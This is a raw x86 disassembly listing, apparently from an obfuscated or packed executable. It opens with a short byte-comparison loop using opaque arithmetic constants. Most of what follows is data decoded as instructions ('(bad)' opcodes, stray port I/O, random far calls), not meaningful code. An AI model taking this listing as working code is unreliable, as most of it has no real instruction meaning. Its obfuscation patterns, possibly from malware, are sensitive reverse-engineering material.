  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	ror    esp,0x0
  405133:	lods   eax,DWORD PTR ds:[esi]
  405134:	mov    eax,0x70702b53
  405139:	cmp    eax,0xc570707d
  40513e:	push   ss
  40513f:	out    0x17,al
  405141:	test   eax,0x6d89bb42
  405146:	push   esi
  405147:	xor    DWORD PTR [esi-0x65],esp
  40514a:	lahf   
  40514b:	sub    bh,ah
  40514d:	in     eax,0x19
  40514f:	add    BYTE PTR [eax+0x36],ah
  405152:	test   eax,0x9454f1d8
  405157:	inc    ebp
  405158:	into   
  405159:	sub    ebx,ebp
  40515b:	sub    edx,DWORD PTR [edx-0x553b927a]
  405161:	cmp    esi,DWORD PTR [esi-0x7801e329]
  405167:	jo     0x405123
  405169:	je     0x405181
  40516b:	jnp    0x405135
  40516d:	mov    edx,0xd1dc0c17
  405172:	mov    ebp,0x6ee3eb7f
  405177:	shl    DWORD PTR [edx],1
  405179:	leave  
  40517a:	int    0x1
  40517c:	scas   al,BYTE PTR es:[edi]
  40517d:	mov    dl,0x8d
  40517f:	les    ebx,FWORD PTR [esi-0x320490b6]
  405185:	in     eax,dx
  405186:	fmul   DWORD PTR [ebp+0x12]
  405189:	pop    es
  40518a:	jecxz  0x4051de
  40518c:	adc    BYTE PTR [edi-0xfb8d55a],cl
  405192:	hlt    
  405193:	aaa    
  405194:	cmp    BYTE PTR [ebx+0x66],bl
  405197:	jne    0x405181
  405199:	adc    bh,BYTE PTR [edx-0x5c9f6b8]
  40519f:	pop    ebx
  4051a0:	ret    
  4051a1:	sbb    cl,BYTE PTR ds:0x4fe985b7
  4051a7:	retf   
  4051a8:	and    al,0x38
  4051aa:	or     DWORD PTR [edi+0x7d],0x45
  4051ae:	ret    0xe0ac
  4051b1:	sbb    eax,0xee388e23
  4051b6:	bound  edi,QWORD PTR [esi]
  4051b8:	xor    ecx,esp
  4051ba:	inc    edi
  4051bb:	mov    al,ds:0xabfb8686
  4051c0:	mov    bl,0xbb
  4051c2:	xor    ah,cl
  4051c4:	adc    bl,BYTE PTR [eax-0x12]
  4051c7:	xchg   edx,eax
  4051c8:	dec    ecx
  4051c9:	bound  esi,QWORD PTR ds:0x83bec740
  4051cf:	div    cl
  4051d1:	leave  
  4051d2:	jae    0x405225
  4051d4:	arpl   WORD PTR [esi],di
  4051d6:	fisttp DWORD PTR [ebp-0x5f2d61ed]
  4051dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051dd:	jl     0x40518f
  4051df:	xchg   edi,eax
  4051e0:	into   
  4051e1:	adc    DWORD PTR [edx+0x4f],eax
  4051e4:	aam    0x64
  4051e6:	mov    ?,WORD PTR [edx-0x59a4302d]
  4051ec:	cs lahf 
  4051ee:	(bad)  
  4051ef:	dec    ecx
  4051f0:	push   edx
  4051f1:	mov    bl,0x80
  4051f3:	xor    eax,0x4b6dfd64
  4051f8:	enter  0xcf69,0xc3
  4051fc:	dec    esi
  4051fd:	mov    BYTE PTR [ecx-0x49],cl
  405200:	and    dl,BYTE PTR [eax+0x2e]
  405203:	fisubr WORD PTR [esi-0x8]
  405206:	mov    cl,0x16
  405208:	(bad)  
  405209:	iret   
  40520a:	jo     0x4051ab
  40520c:	add    BYTE PTR [eax+0x11],dl
  40520f:	out    0x32,eax
  405211:	test   eax,0x2e9f49ee
  405216:	pop    edx
  405217:	iret   
  405218:	enter  0xee17,0x93
  40521c:	(bad)  [ebx+0x29]
  40521f:	push   ebp
  405220:	into   
  405221:	imul   esi,DWORD PTR [edi+0x7b5dc1a0],0x3d39530d
  40522b:	test   al,0x6f
  40522d:	push   0xe5c91166
  405232:	int    0xa
  405234:	nop
  405235:	pushf  
  405236:	xor    DWORD PTR [esi],esi
  405238:	hlt    
  405239:	sub    BYTE PTR [eax+0x3533c874],bl
  40523f:	int    0x4b
  405241:	in     al,0x2b
  405243:	xchg   ecx,eax
  405244:	mov    ah,0xcf
  405246:	mov    al,ds:0xf60724aa
  40524b:	mov    al,0xfc
  40524d:	jmp    DWORD PTR [edi+ebp*1]
  405250:	inc    ebx
  405251:	icebp  
  405252:	adc    DWORD PTR [ecx],ebp
  405254:	pusha  
  405255:	scas   al,BYTE PTR es:[edi]
  405256:	retf   0x8784
  405259:	pop    es
  40525a:	pop    ecx
  40525b:	sub    bh,BYTE PTR [edi+0x322b0c5]
  405261:	fwait
  405262:	arpl   WORD PTR [esi-0x76f73932],cx
  405268:	xor    al,0x44
  40526a:	leave  
  40526b:	or     edi,DWORD PTR [edx]
  40526d:	(bad)  
  40526e:	enter  0xed7c,0xbe
  405272:	test   DWORD PTR [edx+edx*2],ecx
  405275:	mov    WORD PTR [esi+0xa6f7317],fs
  40527b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40527d:	mov    eax,0x1439b7ec
  405282:	jl     0x4052ce
  405284:	jns    0x4052b1
  405286:	popf   
  405287:	imul   esp,ecx,0x50
  40528a:	adc    al,0x5c
  40528c:	xchg   esi,eax
  40528d:	mov    edx,0xfd674fb
  405292:	clc    
  405293:	sti    
  405294:	mov    edx,0x261b3f03
  405299:	mov    ebp,0x25d6a004
  40529e:	sub    dl,BYTE PTR [edx]
  4052a0:	dec    edi
  4052a1:	in     al,0xf0
  4052a3:	pop    ebx
  4052a4:	pop    ebp
  4052a5:	into   
  4052a6:	mov    al,ds:0x79443649
  4052ab:	shr    BYTE PTR [esi],0x75
  4052ae:	enter  0x4887,0xca
  4052b2:	std    
  4052b3:	(bad)  
  4052b4:	loope  0x405242
  4052b6:	into   
  4052b7:	(bad)  
  4052b8:	and    BYTE PTR [edi+0x69ec60e1],cl
  4052be:	ins    DWORD PTR es:[edi],dx
  4052bf:	mov    al,0x86
  4052c1:	xor    eax,0x8c8b31ec
  4052c6:	leave  
  4052c7:	aas    
  4052c8:	jns    0x405279
  4052ca:	push   ds
  4052cb:	or     edi,eax
  4052cd:	mul    BYTE PTR [esi+0x5e844cab]
  4052d3:	mov    eax,ds:0x529d5ecb
  4052d8:	loopne 0x405332
  4052da:	bound  eax,QWORD PTR [ebp-0x595ddf2f]
  4052e0:	fcomp  QWORD PTR [edi+0xd]
  4052e3:	jmp    0x7117:0x15c5fc59
  4052ea:	inc    esi
  4052eb:	ror    BYTE PTR [edi-0x3a],cl
  4052ee:	iret   
  4052ef:	push   ecx
  4052f0:	(bad)  
  4052f1:	repz in eax,dx
  4052f3:	dec    ebp
  4052f4:	repz add ecx,DWORD PTR es:0xb8b67b0b
  4052fc:	inc    ecx
  4052fd:	pop    esp
  4052fe:	test   al,0x5d
  405300:	(bad)  
  405302:	mov    BYTE PTR [ebx],cl
  405304:	idiv   DWORD PTR [esi+0x19e462cf]
  40530a:	imul   ecx,DWORD PTR [ecx+eiz*4-0x5e],0x69
  40530f:	inc    esi
  405310:	xchg   DWORD PTR [edx-0x63],esi
  405313:	sbb    DWORD PTR [edi+edi*1-0x557af593],ebp
  40531a:	pop    ebx
  40531b:	adc    bh,BYTE PTR [eax+ebp*2-0x6ce1ec19]
  405322:	int    0x4e
  405324:	or     dl,dl
  405326:	sub    DWORD PTR [edi-0x25],0x50f9dc36
  40532d:	addr16 jnp 0x4053a7
  405330:	push   ecx
  405331:	or     bh,BYTE PTR [ebx+0x60]
  405334:	or     cl,BYTE PTR [ebx-0x53149dbf]
  40533a:	xlat   BYTE PTR ds:[ebx]
  40533b:	fidiv  DWORD PTR [ecx-0x7d]
  40533e:	push   0xffffffcb
  405340:	mov    eax,0x3472f16d
  405345:	frstor [ebx]
  405347:	scas   al,BYTE PTR es:[edi]
  405348:	iret   
  405349:	pop    ebx
  40534a:	stos   DWORD PTR es:[edi],eax
  40534b:	bound  edi,QWORD PTR [ecx-0x42345377]
  405351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405352:	daa    
  405353:	les    edi,FWORD PTR [ebp+edi*1-0x42c479b8]
  40535a:	pop    ebx
  40535b:	mov    al,ds:0x2521445e
  405360:	mov    es,WORD PTR [ebp-0x47]
  405363:	sub    eax,DWORD PTR [edx]
  405365:	add    DWORD PTR [esi-0x2ec5174c],0xffffffee
  40536c:	sbb    eax,0x9a2fb5e2
  405371:	ret    0x399c
  405374:	(bad)  
  405375:	xor    al,0xd8
  405377:	mov    ds:0x342ab5e2,al
  40537c:	jmp    0x405399
  40537e:	in     eax,0xae
  405380:	pop    DWORD PTR [eax-0x15]
  405383:	sub    eax,0xac7d06b
  405388:	dec    edi
  405389:	and    al,0x5b
  40538b:	cmp    edi,DWORD PTR [eax-0x37f714de]
  405391:	ins    DWORD PTR es:[edi],dx
  405392:	fisub  DWORD PTR [esi+0x7065732]
  405398:	xor    BYTE PTR [edi+edx*2],0x8b
  40539c:	sub    DWORD PTR [edx+ebp*8+0x1b],esp
  4053a0:	xchg   ecx,eax
  4053a1:	retf   0xfd06
  4053a4:	outs   dx,DWORD PTR ds:[esi]
  4053a5:	outs   dx,DWORD PTR ds:[esi]
  4053a6:	mov    dh,dh
  4053a8:	retf   
  4053a9:	and    edx,esp
  4053ab:	xchg   esp,eax
  4053ac:	out    0xea,al
  4053ae:	pop    ss
  4053af:	les    ecx,FWORD PTR [ebp+0xd]
  4053b2:	sar    DWORD PTR [eax-0x253fb8cb],1
  4053b8:	mov    edx,0xcf775f0a
  4053bd:	ret    
  4053be:	fwait
  4053bf:	dec    edx
  4053c0:	fldenv [ebx+0x68]
  4053c3:	pop    es
  4053c4:	ins    BYTE PTR es:[edi],dx
  4053c5:	retf   
  4053c6:	or     ebx,esi
  4053c8:	ret    0xdc59
  4053cb:	lea    esi,ds:0x7b223401
  4053d1:	inc    edi
  4053d2:	mov    al,0x92
  4053d4:	cmp    BYTE PTR [edi],0x9
  4053d7:	xor    eax,0x3162241d
  4053dc:	loope  0x4053b5
  4053de:	jne    0x40539f
  4053e0:	loopne 0x4053f2
  4053e2:	sbb    esp,ebp
  4053e4:	stos   BYTE PTR es:[edi],al
  4053e5:	addr16 xor al,0x6b
  4053e8:	add    eax,0xb0b13714
  4053ed:	adc    al,0xe5
  4053ef:	ss push 0xffffffc9
  4053f2:	push   ecx
  4053f3:	sahf   
  4053f4:	and    BYTE PTR [ecx+0x648a34d8],dl
  4053fa:	ret    0x19b7
  4053fd:	xchg   ecx,eax
  4053fe:	add    DWORD PTR [ebx-0x107ca009],edi
  405404:	inc    esp
  405405:	inc    eax
  405406:	out    0x9f,eax
  405408:	stc    
  405409:	sub    al,0xc6
  40540b:	mov    bh,BYTE PTR [edx]
  40540d:	push   eax
  40540e:	test   DWORD PTR gs:[esi-0x3a],esp
  405412:	jae    0x40545e
  405414:	test   eax,0xd25bd92e
  405419:	xchg   ecx,eax
  40541a:	out    0xca,al
  40541c:	add    BYTE PTR [edi-0x3051a9c3],0x76
  405423:	mov    al,0x1c
  405425:	cmp    eax,0xdbc7bce0
  40542a:	or     DWORD PTR [edi-0x7d],edi
  40542d:	push   0xffffff8f
  40542f:	std    
  405430:	mov    BYTE PTR [esp+ebx*8],bh
  405433:	cwde   
  405434:	int3   
  405435:	mov    dl,0x64
  405437:	adc    al,0x95
  405439:	add    ebx,DWORD PTR [ecx-0x9]
  40543c:	sub    ebp,esp
  40543e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40543f:	push   eax
  405440:	xchg   ecx,eax
  405441:	mov    dh,0xa4
  405443:	fistp  DWORD PTR [edx+0x27]
  405446:	cmp    edi,DWORD PTR [ecx]
  405448:	push   DWORD PTR [eax+0x6cb7959d]
  40544e:	loopne 0x4054a0
  405450:	push   es
  405451:	pop    ebp
  405452:	pop    es
  405453:	fidiv  WORD PTR [esi]
  405455:	stos   DWORD PTR es:[edi],eax
  405456:	scas   eax,DWORD PTR es:[edi]
  405457:	loop   0x40549e
  405459:	fcomp  DWORD PTR [edx+0x5a83e981]
  40545f:	aaa    
  405460:	cmp    dl,BYTE PTR [esi+esi*4+0x6]
  405464:	push   esp
  405465:	cmp    ch,BYTE PTR [ecx-0x6c]
  405468:	(bad)  
  405469:	rol    BYTE PTR [ebp-0xf],cl
  40546c:	mov    WORD PTR [edi+0x73],?
  40546f:	or     al,0x77
  405471:	add    cl,BYTE PTR [ecx]
  405473:	push   edx
  405474:	fiadd  WORD PTR [ebp-0x34bdc0b7]
  40547a:	cmp    edx,DWORD PTR [esi]
  40547c:	push   ecx
  40547d:	fwait
  40547e:	adc    al,0xec
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	int3   
  4054a9:	lods   eax,DWORD PTR ds:[esi]
  4054aa:	shl    BYTE PTR [ecx],0x10
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x40545e
  4054b5:	in     al,0x8e
  4054b7:	xor    bl,ah
  4054b9:	push   ecx
  4054ba:	imul   ebx,DWORD PTR [ebp-0x7f],0xb397a9e6
  4054c1:	push   0x34215d3d
  4054c6:	sub    ch,BYTE PTR [ebx-0x32976ced]
  4054cc:	jge    0x4054f2
  4054ce:	retf   
  4054cf:	pop    ebx
  4054d0:	sbb    DWORD PTR [edi],edx
  4054d2:	mov    ch,bl
  4054d4:	mov    eax,0x1816f0b3
  4054d9:	clc    
  4054da:	mov    eax,0xa95500ae
  4054df:	test   eax,0xaeb39305
  4054e4:	pop    es
  4054e5:	outs   dx,DWORD PTR ds:[esi]
  4054e6:	test   al,0x74
  4054e8:	inc    eax
  4054e9:	xchg   edi,eax
  4054ea:	fld    DWORD PTR [ecx+eiz*1+0x7]
  4054ee:	xor    ecx,0x19
  4054f1:	data16 jl 0x405484
  4054f4:	push   edx
  4054f5:	adc    DWORD PTR [eax+0x6a],esp
  4054f8:	mov    eax,0xf951ae21
  4054fd:	fs out dx,eax
  4054ff:	inc    edi
  405500:	retf   0x7359
  405503:	mov    ss,WORD PTR [eax]
  405505:	xchg   ebp,eax
  405506:	stc    
  405507:	add    DWORD PTR [ebp+0x14fc5bb0],esi
  40550d:	repnz push ecx
  40550f:	(bad)  [ebx+esi*1+0x788b43a]
  405516:	jl     0x40550d
  405518:	mov    ch,0x38
  40551a:	and    DWORD PTR [edi+edi*4],esi
  40551d:	push   ds
  40551e:	push   esp
  40551f:	stos   BYTE PTR es:[edi],al
  405520:	xchg   esp,eax
  405521:	test   al,0xb6
  405523:	iret   
  405524:	pop    edx
  405525:	sbb    DWORD PTR es:[eax-0x14b2fcb9],edx
  40552c:	call   0xb67b:0x3013969e
  405533:	sub    dh,BYTE PTR [edi]
  405535:	or     ebp,esi
  405537:	mov    dl,0x3d
  405539:	cmp    esp,DWORD PTR [ebp+0x1cced2da]
  40553f:	sti    
  405540:	imul   ebp,DWORD PTR [ebx+esi*8-0x5b9304d6],0x508d30d6
  40554b:	sub    al,0xe0
  40554d:	dec    esi
  40554e:	jbe    0x405508
  405550:	test   ebp,edi
  405552:	jmp    0x40551e
  405554:	xchg   edi,eax
  405555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405556:	bnd ja 0x4055b1
  405559:	push   es
  40555a:	push   esi
  40555b:	fldenv [ebx+esi*1]
  40555e:	ret    0xb521
  405561:	lahf   
  405562:	xchg   ebx,eax
  405563:	gs cmc 
  405565:	sbb    eax,0x35f97fb
  40556a:	xor    eax,0x8e4656
  40556f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405570:	xlat   BYTE PTR ds:[ebx]
  405571:	adc    edi,edi
  405573:	rcr    BYTE PTR [esi-0x12],1
  405576:	push   0x7e
  405578:	je     0x405596
  40557a:	fdivr  QWORD PTR [edi+0x3f8aee28]
  405580:	pop    edi
  405581:	sub    edx,DWORD PTR [esi+0x1a]
  405584:	cmp    BYTE PTR [edi+0x45],0x2a
  405588:	mov    al,ds:0xafa7852c
  40558d:	xor    ecx,DWORD PTR [ecx]
  40558f:	sbb    eax,0x11b5c7f6
  405594:	pop    ss
  405595:	(bad)  
  405596:	fsub   st,st(3)
  405598:	inc    esi
  405599:	retf   
  40559a:	sbb    ah,BYTE PTR [edi]
  40559c:	repz adc bh,BYTE PTR ss:[esi]
  4055a0:	mov    WORD PTR [edi+0x49],ds
  4055a3:	in     eax,dx
  4055a4:	mov    BYTE PTR ds:0x82eddbde,al
  4055aa:	sbb    DWORD PTR [edi+esi*2],0x4d
  4055ae:	sahf   
  4055af:	and    ebp,esp
  4055b1:	push   edx
  4055b2:	push   ebp
  4055b3:	(bad)  
  4055b4:	imul   ebp,DWORD PTR ds:0x6611fff1,0xfffffff6
  4055bb:	push   ds
  4055bc:	loope  0x4055f5
  4055be:	sub    eax,DWORD PTR [ebx-0x416c3584]
  4055c4:	jb     0x4055e5
  4055c6:	sub    ecx,edx
  4055c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055c9:	lds    esp,FWORD PTR [ecx]
  4055cb:	jne    0x4055d6
  4055cd:	nop
  4055ce:	(bad)
  4055d1:	pop    ss
  4055d2:	outs   dx,DWORD PTR ds:[esi]
  4055d3:	xchg   DWORD PTR [ebp+0x4391050b],ecx
  4055d9:	sub    DWORD PTR [eax],edx
  4055db:	sub    bh,BYTE PTR [ebx+0x4543f512]
  4055e1:	rcr    esi,cl
  4055e3:	jae    0x40564e
  4055e5:	les    ebp,FWORD PTR [eax]
  4055e7:	rcl    DWORD PTR [edx-0x17],cl
  4055ea:	add    eax,0x273c91b9
  4055ef:	cmp    eax,0x6f001691
  4055f4:	jl     0x4055d6
  4055f6:	shl    DWORD PTR [ebx+0x8],1
  4055f9:	xchg   DWORD PTR [edi+0x79],ebx
  4055fc:	addr16 pop esi
  4055fe:	pop    esp
  4055ff:	outs   dx,BYTE PTR ds:[esi]
  405600:	in     eax,0xce
  405602:	adc    BYTE PTR [esi],0x82
  405605:	ret    
  405606:	xlat   BYTE PTR ds:[ebx]
  405607:	push   esi
  405608:	shl    DWORD PTR [eax+0x1d],cl
  40560b:	les    edx,FWORD PTR [eax+0x7f]
  40560e:	adc    bl,dl
  405610:	scas   eax,DWORD PTR es:[edi]
  405611:	dec    ebp
  405612:	stos   BYTE PTR es:[edi],al
  405613:	mov    bl,0xfe
  405615:	fbstp  TBYTE PTR [ecx-0x47061180]
  40561b:	xchg   esi,eax
  40561c:	data16 jge 0x405662
  40561f:	ins    DWORD PTR es:[edi],dx
  405620:	int    0x57
  405622:	in     al,0x4f
  405624:	fiadd  DWORD PTR [ecx-0x7266029d]
  40562a:	sbb    BYTE PTR [edi+0x5],ah
  40562d:	mov    ch,0x24
  40562f:	jle    0x405602
  405631:	fbld   TBYTE PTR ds:0xdf58a6b9
  405637:	dec    ebp
  405638:	xlat   BYTE PTR ds:[ebx]
  405639:	mov    bh,0x30
  40563b:	mov    DWORD PTR [edi-0x298cb1d3],0x2ad4fb3d
  405645:	mov    ah,0xe8
  405647:	cmp    al,0xd3
  405649:	sbb    al,0xd2
  40564b:	rol    dh,1
  40564d:	sub    eax,0x535f815
  405652:	xchg   ebx,eax
  405653:	aas    
  405654:	sbb    DWORD PTR [ecx+eiz*8-0x2124e301],ebp
  40565b:	sbb    eax,0x290d3d5f
  405660:	xor    ebp,eax
  405662:	imul   ebx,DWORD PTR [ebp+0x1b],0x44
  405666:	inc    esi
  405667:	add    BYTE PTR [edx+0x356e339e],al
  40566d:	jl     0x405639
  40566f:	push   esp
  405670:	repnz pop ss
  405672:	jns    0x4056bb
  405674:	ja     0x4056b4
  405676:	inc    ebx
  405677:	pop    esp
  405678:	dec    eax
  405679:	pop    edi
  40567a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40567b:	call   0x5ff7d9ff
  405680:	adc    DWORD PTR [ecx],edx
  405682:	push   ebp
  405683:	jb     0x40560f
  405685:	mov    ds:0x854beedd,eax
  40568a:	push   ss
  40568b:	test   BYTE PTR [eax],ch
  40568d:	in     al,dx
  40568e:	xchg   BYTE PTR [ebp+0x36],al
  405691:	mov    gs,ebp
  405693:	fdiv   st(0),st
  405695:	pop    edx
  405696:	lahf   
  405697:	out    dx,eax
  405698:	lahf   
  405699:	ret    0xd307
  40569c:	cmp    cl,bl
  40569e:	loop   0x4056c8
  4056a0:	loop   0x405646
  4056a2:	test   al,0xc2
  4056a4:	add    BYTE PTR [esp],ch
  4056a7:	popa   
  4056a8:	pop    eax
  4056a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056aa:	int3   
  4056ab:	rcr    BYTE PTR [esi-0x195acbbb],cl
  4056b1:	les    esp,FWORD PTR [esi-0x37da7bec]
  4056b7:	sub    eax,DWORD PTR [edi+ebx*1]
  4056ba:	lods   eax,DWORD PTR ds:[esi]
  4056bb:	sbb    dh,BYTE PTR es:[edi]
  4056be:	xor    dl,BYTE PTR [eax]
  4056c0:	in     al,dx
  4056c1:	sub    al,0xe5
  4056c3:	cmp    ebx,DWORD PTR [edx]
  4056c5:	inc    ecx
  4056c6:	or     al,0x3
  4056c8:	and    DWORD PTR [edx+0x48d8c3ac],0xffffffe2
  4056cf:	call   0x3977:0xa2fd479f
  4056d6:	mov    al,ds:0xa70510d5
  4056db:	int3   
  4056dc:	dec    ecx
  4056dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056de:	mov    BYTE PTR [esi+0x40],al
  4056e1:	mov    esp,0x9d927881
  4056e6:	or     dh,BYTE PTR [eax+0x1f2a9bf8]
  4056ec:	inc    eax
  4056ed:	mov    ?,WORD PTR ds:0x6ec3f77
  4056f3:	lahf   
  4056f4:	adc    dl,dl
  4056f6:	pop    edx
  4056f7:	cwde   
  4056f8:	adc    eax,0x487e525c
  4056fd:	cld    
  4056fe:	pop    ds
  4056ff:	sbb    eax,0x3ab1063f
  405704:	rcl    eax,0xe6
  405707:	cli    
  405708:	bnd jg 0x4056be
  40570b:	aam    0x92
  40570d:	int3   
  40570e:	mov    al,ds:0xa17c198a
  405713:	xchg   edx,eax
  405714:	pop    edx
  405715:	loopne 0x405710
  405717:	div    BYTE PTR [ebx]
  405719:	stos   BYTE PTR es:[edi],al
  40571a:	imul   ebp,DWORD PTR [ecx],0x49571756
  405720:	icebp  
  405721:	cmc    
  405722:	dec    esp
  405723:	mov    edx,0xe47a1ffc
  405728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405729:	cmp    bl,BYTE PTR [edi]
  40572b:	mov    eax,ds:0xe6127acd
  405730:	and    DWORD PTR [ebp-0x62],esi
  405733:	adc    al,0x4
  405735:	arpl   WORD PTR [edi-0x40f26791],cx
  40573b:	dec    ecx
  40573c:	and    eax,DWORD PTR [ebx+0x38f53fa5]
  405742:	push   ebx
  405743:	sub    BYTE PTR [eax],bl
  405745:	and    ch,BYTE PTR [edi+0x4]
  405748:	(bad)
  40574b:	in     al,0x94
  40574d:	mov    al,0x4a
  40574f:	test   BYTE PTR [ecx+0x33ac6ffc],dh
  405755:	jp     0x40571d
  405757:	mov    cl,dh
  405759:	add    BYTE PTR [ecx+ecx*4+0x2636fb00],0x51
  405761:	ret    0x7cfc
  405764:	or     ebx,DWORD PTR [eax+0x79561ce8]
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x484a91be],eax
  405790:	dec    eax
  405791:	(bad)  
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	shl    BYTE PTR [eax],cl
  40579c:	in     al,dx
  40579d:	sub    cl,BYTE PTR ds:0xbd43a254
  4057a3:	adc    dh,BYTE PTR [eax+ebp*4+0x8]
  4057a7:	shl    ebx,1
  4057a9:	jo     0x4057d3
  4057ab:	add    ecx,edi
  4057ad:	(bad)
  4057b1:	add    edi,DWORD PTR [esi+ecx*4+0x17d0b0ef]
  4057b8:	jne    0x40582d
  4057ba:	pop    edi
  4057bb:	sub    eax,0xb3f33abe
  4057c0:	fcmovnu st,st(2)
  4057c2:	lods   al,BYTE PTR ds:[esi]
  4057c3:	mov    ecx,0xc081db25
  4057c8:	call   0xa5ee:0xac9a9e94
  4057cf:	xchg   ebp,eax
  4057d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057d1:	shl    BYTE PTR [esp+ebx*1-0x56a175ba],1
  4057d8:	sub    eax,0x66161413
  4057dd:	pop    ebx
  4057de:	outs   dx,DWORD PTR ds:[esi]
  4057df:	lods   al,BYTE PTR ds:[esi]
  4057e0:	cmp    eax,0xeddc3515
  4057e5:	in     eax,dx
  4057e6:	int    0x1
  4057e8:	sub    al,0x4
  4057ea:	jg     0x405776
  4057ec:	std    
  4057ed:	add    dh,BYTE PTR [esi+0x3c]
  4057f0:	dec    ebx
  4057f1:	push   edi
  4057f2:	loope  0x4057c8
  4057f4:	cwde   
  4057f5:	push   ss
  4057f6:	mov    esp,0x7fba432c
  4057fb:	outs   dx,BYTE PTR ds:[esi]
  4057fc:	rol    bl,cl
  4057fe:	into   
  4057ff:	mov    ebp,0x2dfeb45d
  405804:	imul   esp,DWORD PTR [ebp+0x2cf2efc],0x516699c7
  40580e:	sbb    ecx,esi
  405810:	sbb    esi,DWORD PTR [edx]
  405812:	(bad)  
  405813:	fnstcw WORD PTR [edi]
  405815:	xor    edi,DWORD PTR [esi]
  405817:	sub    BYTE PTR [eax-0x1d8c7dcc],cl
  40581d:	nop
  40581e:	xor    DWORD PTR [edi],0x8e6de564
  405824:	sti    
  405825:	xchg   esi,eax
  405826:	push   ds
  405827:	xchg   esp,eax
  405828:	pop    ebx
  405829:	std    
  40582a:	cmp    eax,0x6b75d7ce
  40582f:	fistp  WORD PTR [esi]
  405831:	pop    ds
  405832:	aad    0x2b
  405834:	out    0xa4,eax
  405836:	fisttp DWORD PTR [esi-0x6d]
  405839:	in     al,dx
  40583a:	fmul   DWORD PTR [ecx]
  40583c:	push   ss
  40583d:	push   edx
  40583e:	dec    esp
  40583f:	icebp  
  405840:	stos   BYTE PTR es:[edi],al
  405841:	mov    WORD PTR [ebp-0x2ea88b2d],fs
  405847:	repnz add eax,0xa8db5c90
  40584d:	jns    0x4057ed
  40584f:	sub    al,0x42
  405851:	mov    bh,0xd7
  405853:	pop    esi
  405854:	inc    edx
  405855:	mov    BYTE PTR es:[eax],dh
  405858:	xor    ecx,edx
  40585a:	mov    DWORD PTR ds:0xf2dc41ed,0x61639b14
  405864:	les    esi,FWORD PTR ds:0x938e3615
  40586a:	sub    DWORD PTR [ebp-0x5bd6c35d],ebx
  405870:	jnp    0x40587c
  405872:	mov    eax,ds:0x843782e4
  405877:	rcl    esi,0x66
  40587a:	(bad)  
  40587c:	xchg   esi,eax
  40587d:	pop    ss
  40587e:	in     eax,dx
  40587f:	scas   al,BYTE PTR es:[edi]
  405880:	test   BYTE PTR [ebx+0x56],cl
  405883:	sub    al,0x97
  405885:	cld    
  405886:	add    BYTE PTR [esi],ah
  405888:	push   es
  405889:	push   ebp
  40588a:	loopne 0x40582e
  40588c:	out    0xa,al
  40588e:	mov    ebp,0xeb0c47f8
  405893:	xor    DWORD PTR [edx],0xc096ffe0
  405899:	lahf   
  40589a:	add    DWORD PTR [ecx+0x6566e777],ebx
  4058a0:	jmp    0x67ba00ef
  4058a5:	pop    ebp
  4058a6:	in     al,dx
  4058a7:	and    eax,0xda14862d
  4058ac:	retf   0x81b0
  4058af:	push   cs
  4058b0:	daa    
  4058b1:	div    edi
  4058b3:	rol    esi,0xa3
  4058b6:	call   0x6a3f:0x6873ca0e
  4058bd:	mov    edx,0xd7fa7aa2
  4058c2:	(bad)  
  4058c3:	inc    ebp
  4058c4:	call   0xf1af9286
  4058c9:	std    
  4058ca:	mov    ch,0xf4
  4058cc:	aaa    
  4058cd:	daa    
